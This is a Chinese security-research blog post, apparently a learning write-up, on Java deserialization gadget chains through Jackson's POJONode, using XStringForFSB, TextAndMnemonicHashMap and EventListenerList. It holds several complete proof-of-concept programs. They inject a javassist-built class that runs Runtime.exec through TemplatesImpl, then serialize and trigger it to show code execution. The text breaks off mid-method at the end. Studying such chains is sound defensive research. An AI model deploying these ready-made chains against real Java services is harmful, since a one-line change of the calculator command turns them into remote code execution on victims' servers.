这个类位于com.sun.org.apache.xpath.internal.objects.XStringForFSB，其父类是XStirng。\n其实这个和ROME链的HotSwappableTargetSource链有点关联，在那条ROME链中，是通过HotSwappableTargetSource调用到XString的的equals()方法，从而调用到任意类的toString()方法。\n这里的XStringForFSB类的equals()方法同样可以调用到任何类的toString()方法：\n所以还是可以作为一个中继链来调用到任意类的toString()方法。\n这里的目的是调用到XStringForFSB类的equals()方法，最经典的就是还是Hashtbale了，也比较容易看，这里来尝试构造一下，使用两个HashMap，参考ROME链的equals链，主要的触发点在AbstractMap类的equals()方法：\n老生常谈的方法了，简单构造一下，这里本来想选用的构造函数为：\n反射获取就可，但是赋值完就丢出异常，表示不能为字符串，只能放弃。看另外一个构造函数：\nsuper()赋值就是一直往上调用，其实就是给父类的父类XObject的变量赋值：\n这个变量其实是XString链提到过的，但这里没啥用。从原先的链子中可以看出，都不会利用到这的变量，那么就尝试只将其能正常实例化，让AI给一个正常实例化的代码，经测试如下可用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package jackson; import com.sun.org.apache.xml.internal.utils.FastStringBuffer; import com.sun.org.apache.xpath.internal.objects.XStringForFSB; public class Text { public static void main(String[] args) { FastStringBuffer fsb = new FastStringBuffer(); fsb.append(\u0026#34;Hello, this is a sample string stored in FastStringBuffer!\u0026#34;); // 2. 定义起始位置和提取长度 int start = 7; // 从第8个字符开始（索引从0开始） int length = 10; // 提取10个字符 // 3. 创建 XStringForFSB 实例 XStringForFSB xString = new XStringForFSB(fsb, start, length); System.out.println(xString); } } 输出为：\n1 this is a 输出为这个不要紧，只要它是这个类实例即可：\n那么就可以尝试构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.util.HashMap; import java.util.Hashtable; import com.sun.org.apache.xml.internal.utils.FastStringBuffer; import com.sun.org.apache.xpath.internal.objects.XStringForFSB; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); FastStringBuffer fsb = new FastStringBuffer(); fsb.append(\u0026#34;Hello, this is a sample string stored in FastStringBuffer!\u0026#34;); XStringForFSB stringForFSB = new XStringForFSB(fsb, 7, 10); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;yy\u0026#34;,stringForFSB); hashMap1.put(\u0026#34;zZ\u0026#34;,node); HashMap hashMap2 = new HashMap(); hashMap2.put(\u0026#34;yy\u0026#34;,node); hashMap2.put(\u0026#34;zZ\u0026#34;,stringForFSB); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(hashMap2,\u0026#34;2\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 成功弹出计算机，并且链子也是符合预期的，那么怎么只在反序列化时弹出里计算机呢？其实可以参考下面这条链子的绕过方法，但是这里忽略了一个非常重要的问题，FastStringBuffer不可被序列化，并且它还没有父类：\n调不动了，留个坑点。\nTextAndMnemonicHashMap 这个类位于javax.swing.UIDefaults$TextAndMnemonicHashMap，也就是UIDefaults类的一个内部类，这个类的get()方法会触发toString()方法：\n调用get的话，就不得不提到HashMap类的调用get()的方法：\n同样是谈了很多次的这个方法，那么现在控制这里的m为TextAndMnemonicHashMap类，这里的key为POJONode类，但是这个TextAndMnemonicHashMap类是一个private内部类，不能直接导入，反射获取它的构造方法来进行创建即可，然后这里让被用来序列化的类为Hashtable，入口就可以参照CC7，先是一个简单的根据前面提出的要求来进行的构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text = (Map)constructor.newInstance(); HashMap hashMap1 = new HashMap(); hashMap1.put(node,\u0026#34;1\u0026#34;); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(text,\u0026#34;1\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 运行是没有弹出计算机的，那么现在就来考虑一下hash值相同的问题，可以直接用上面的代码来调试，重点是hash值的计算，就都打上断点来看一下这里的hash值计算情况：\n先来看第一个放入的hashMap1的计算情况：\n会调用HashMap类的hashCode()方法：\n然后会调用到hashCode()方法：\n也就是计算键值对的hash值然后进行抑或的一个操作，然后就顺利放进了这个键值对。\n第二次put()是最重要的操作，会进行hash值是否相等等一系列计算，跟进一下，同样会进入到如下的代码：\n如果存在键值对的话，就同样会进行哈希值的计算，这里也会调用这个的原因应该是因为TextAndMnemonicHashMap不存在hashCode()方法，但是其父类是HashMap类：\n那么是否可以通过让其键值对都相同从而让hash值相同呢，直接在text中放入键值对就行了:\n1 2 Map text = (Map)constructor.newInstance(); text.put(node,\u0026#34;1\u0026#34;); 再次调试，如下：\n确实可以，那么现在就是考虑是否可以放入两个键值对的问题了。继续跟进，确实成功调用到了equals()方法，但是此时竟然报了如下的错误；\n直接求值了？这里调用getKey()会对key进行一次调用toString()方法？跟进一下getKey()看看呢：\n这里是直接返回值的操作，难道是因为这里的k是字符串类型？我这里传入的是一个类实例，所以会自动调用到这个类的toString()方法，导致了一次调用链的执行？但是又有时候弹计算机了有时候没弹（大部分时候没弹）\n那么这里该怎么绕过呢？这里我想到了一个点，能否直接修改Hashtable中的存储表来进行利用，比如这里其实Hashtable和HashMap等的存储表都是通过他们的内置类Entry来实现的，可以跟进一下put()方法的后续代码:\n跟进这个addEntry()方法：\n就是一个实例化Node的操作。所以就是直接修改这个存储表，而存储表一般都是放在类的table变量中的：\n但是这里的反射获取到相关类构造方法没搞出来，不然就只有一个一个变量获取到然后进行修改。并且其实这个直接修改在这也是没有什么大用的，就算在序列化前修改了，但是在反序列化时同样会报这个错误，同样会在getKey()方法处调用到toString()方法。\n其实如果能稳定弹出计算机，这样也算是在反序列化时弹出计算机，只是不是根据链子进行的，但是这里不知道为什么有时候能弹有时候弹不了，只能放弃。\n还是不行呀，看了一下网上的分析文章，是用的TextAndMnemonicHashMap类来调用到equals()方法，正如前面谈到过的，这里的TextAndMnemonicHashMap类的父类是HashMap类，所以调用equals()方法时会一步一步往父类找，最后还是会调用到预期的equals()方法，但是其本质其实都是相同的，对于hash值相同的问题在前面也已经早就解决，当务之急还是看如何解决自动调用toString()方法的问题，想不出来，也没调出来，看一下网上现有的POC，理解了一下，然后改成自己常用的风格，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Hashtable; import java.util.Map; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception{ //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Map tHashMap1 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); Map tHashMap2 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); tHashMap1.put(node, \u0026#34;123\u0026#34;); tHashMap2.put(node, \u0026#34;12\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tHashMap1,1); hashtable.put(tHashMap2,1); tHashMap1.put(node, null); tHashMap2.put(node, null); setFieldValue(tHashMap1, \u0026#34;loadFactor\u0026#34;, 0.75f); setFieldValue(tHashMap2, \u0026#34;loadFactor\u0026#34;, 0.75f); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static Object getObject(Class clazz) throws Exception{ Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); return constructor.newInstance(); } public static void setFieldValue(Object obj, String key, Object val) throws Exception{ Field field = null; Class clazz = obj.getClass(); while (true){ try { field = clazz.getDeclaredField(key); break; } catch (NoSuchFieldException e){ clazz = clazz.getSuperclass();//非常有必要 } } field.setAccessible(true); field.set(obj, val); } } 这样就可以完全成功弹出计算机，并且在控制台会报错，简单看一下确实是按照预期的链子走的，重点的需要理解的是如下的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 Map tHashMap1 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); Map tHashMap2 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); tHashMap1.put(node, \u0026#34;123\u0026#34;); tHashMap2.put(node, \u0026#34;12\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tHashMap1,1); hashtable.put(tHashMap2,1); tHashMap1.put(node, null); tHashMap2.put(node, null); setFieldValue(tHashMap1, \u0026#34;loadFactor\u0026#34;, 0.75f); setFieldValue(tHashMap2, \u0026#34;loadFactor\u0026#34;, 0.75f); getObject()是自定义的获取构造器然后进行实例化的操作，重点是后面的内容，为什么要再次调用put()方法将value值变成null，简单从代码层面来理解，如下代码：\n1 2 tHashMap1.put(node, \u0026#34;123\u0026#34;); tHashMap2.put(node, \u0026#34;12\u0026#34;); 这里的两个类放入的键值对的值不同，那么对于后续的Hashtable调用时put()方法时的hash值肯定不同，也就不会调用equals()方法来进行比较，从而成功放入了键值对，那么后面两个“tHashMap“又再次调用put()方法是为了进行一个键值对的值的更新操作，所以在反序列化时的判断的hash值就会相同了，从而可以成功进行一次调用链的执行？从控制台的报错确实是对的，但是这里就不会在getKey()时报错吗？如果从这个方面来看的话，主要的不同点就是在如下代码：\n1 2 setFieldValue(tHashMap1, \u0026#34;loadFactor\u0026#34;, 0.75f); setFieldValue(tHashMap2, \u0026#34;loadFactor\u0026#34;, 0.75f); 这里是对HashMap类中的loadFactor变量进行了修改，这里的setFieldValue()方法定义也值得学习，可以获取到父类中的变量并进行修改，扩大了利用面。所以为什么需要对这里进行修改呢，尝试一下将这里改成没有这个，发现还是成功弹出计算机！（但是原文章的原格式确实需要，这就与HashMap反序列化时的问题相关了，这里不多说）调试了一下这里的过程，理解到了为什么，这里就简单说说吧，在前面的代码构造中，我一直忘记了一个点：\n这里需要value的值为null才能成功调用这个toString()方法，并且虽然反序列化时同样有这个异常错误，但是从参数看，这个值代表的还是我们想要的类，下面从前面的我自己构造的代码说明一下，贴一下前面“自认为是自动调用toString()方法造成错误“的点的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text = (Map)constructor.newInstance(); text.put(node,\u0026#34;1\u0026#34;); HashMap hashMap1 = new HashMap(); hashMap1.put(node,\u0026#34;1\u0026#34;); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(text,\u0026#34;1\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 这里可以在TextAndMnemonicHashMap类的get()方法加一个断点：\n调试原先的代码，发现在getKey()方法还是报异常错误，但是确实会调用到这里，并且看此时的key所代表的值：\n就是正常的POJONode类，都是自己构造的，然后成功调用到了TextAndMnemonicHashMap类的get()方法：\n从这个get()方法的逻辑，可以看出来是会先获取到对应key的value，只有这里的value为null，才能调用到toString()方法，也就是需要TextAndMnemonicHashMap类所对应的\u0026quot;HashMap\u0026quot;类的键值对的值为null，基于上面的情况，可以简单改一下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text = (Map)constructor.newInstance(); text.put(node,null); HashMap hashMap1 = new HashMap(); hashMap1.put(node,null); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(text,\u0026#34;1\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 这样就可以稳定在序列化前按照预期成功调用一次调用链。值得注意的是，由于为了保证hash值相同，这里让hashMap1的value也改成了null，那么此时在AbstractMap类的equals()方法调用get()方法也有改变：\n由于将value改成了null，所以这里value返回值也是null，进入了第一个if条件，还是调用到了一次get()方法，后面就都是预期的了。\n那么反序列化如何绕过呢，前面给出的POC已经可以说明了，在Hashtable放入值时直接让hash值不同从而可以正常放入，后面再调用put()方法来进行一次更新值的操作，所以最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text0 = (Map)constructor.newInstance(); text0.put(node,\u0026#34;aa1\u0026#34;); Map text1 = (Map)constructor.newInstance(); text1.put(node,\u0026#34;aa2\u0026#34;); Hashtable table = new Hashtable(); table.put(text1,\u0026#34;1\u0026#34;); table.put(text0,\u0026#34;1\u0026#34;); text0.put(node,null); text1.put(node,null); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(table); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 经测试发现如果是想使用HashMap和TextAndMnemonicHashMapl作为Hashtable中的两个键，在Hashtable的反序列化时，先后顺序会发生改变，这个问题我在JD7u21原生链提过，这里不再多说，使用上面的代码就行了。\n总结：\n得抓一下重点呀，就那一个点，也是比较关键的一点，构造代码时没注意到。还是卡了一段时间。 EventListenerList 这个类位于javax.swing.event.EventListenerList，同样是可以调用任意类的getter方法，先来跟进这个类的readObject()方法：\n然后跟进这里的add()方法：\n当l不是t的类或接口的实例化时，这里就会进入抛出异常的操作，但是这里的抛出异常的操作是进行了一个字符串拼接的操作，所以只要控制得好l，那么久可以调用任意类的toString()方法。再回过去看参数传递的要求：\n这里的forName()方法，正好是当时学反射时说明了的，虽然有几个参数传递，但是其实就是相当于调用的forName()，这里的cl就是一个类加载器，也就是可以获取到一个Class对象，然后看这里的l，可以知道是从数据读出并且有一个强制类型转换，也就是要求其为一个与EventListener有关联的对象。再看一下EventListenerList类的writeObject()方法：\n大概就可以知道这里的序列化所需的变量了，并且可以和反序列化对应起来，有在反序列化利用的可能性。\n那么在这里可以利用到的是javax.swing.undo.UndoManager类，它的接口UndoableEditListener是java.util.EventListener的子类，跟进这个类的toString()方法：\n这里调用了父类的toString()方法，还调用了两个变量，但是这两个变量都定义为int类型：\n1 2 int indexOfNextAdd; int limit; 无法利用，继续跟进父类CompoundEdit的toString()方法：\n看此时这两个变量的定义：\n可以看到inProgress是布尔型，而edits在实例化时会赋值为一个Vector类实例，并且UndoManager类实例化时久可以保证这个父类也实例化，再看CompoundEdi类的toString()方法，同样是字符串拼接的操作，所以可以调用到Vector类的toString()方法：\n再跟进父类AbstractCollection的toString()方法：\n跟进这里的append()方法：\n这里的value()方法可以调用到任意类的toString()方法：\n个人觉得利用点是前面图中用框标出来的append方法，那么就可以尝试进行构造了，就简单说明几个点：\nEventListenerList无构造方法，需要利用到Object[]类型的listenerList变量，反射修改即可，一定要看懂writeObject()的逻辑，这样才能构造出来。\n另外的一个比较重要的点就是如下：\n怎么控制这个e为任意类型。重点就在于这个iterator()方法，再回想一下整个过程，到这一步的toString()方法，已经是和Vector类相关了，也就是说这里的self为Vector类实例，并且简单构造代码调试也是如预期的，而在Vector类的iterator()方法，是返回的一个内部类Itr实例：\n里面就定义了一些简单的next()函数用于迭代，在原先的toString()方法中，可以知道是，跟进next()函数最后返回的elementData：\n其实就是返回存储在这个当中的值，所以我们肯定是要将node放进这个数组当中的。对于这个elementData数组，Vector类定义了很多方法来进行操作，如insertElementAt：\n等。\n所以这也是可以操作的，但是要怎么将这个设计好的Vector类插入进去呢？在原本的利用链中，是直接将Vector实例化的：\n还是反射进行修改，具体看下面的POC即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.swing.undo.UndoManager; import javax.swing.event.EventListenerList; import java.lang.reflect.Field; import java.util.Vector; public class Main { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //修改类方法 CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //也可以直接删去这个类 ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); UndoManager undo = new UndoManager(); Object[] x = new Object[]{String.class, undo}; EventListenerList listenerList = new EventListenerList(); setFieldValue(listenerList, \u0026#34;listenerList\u0026#34;, x); Vector vector = (Vector) getFieldValue(undo, \u0026#34;edits\u0026#34;); vector.add(node); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(listenerList); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void 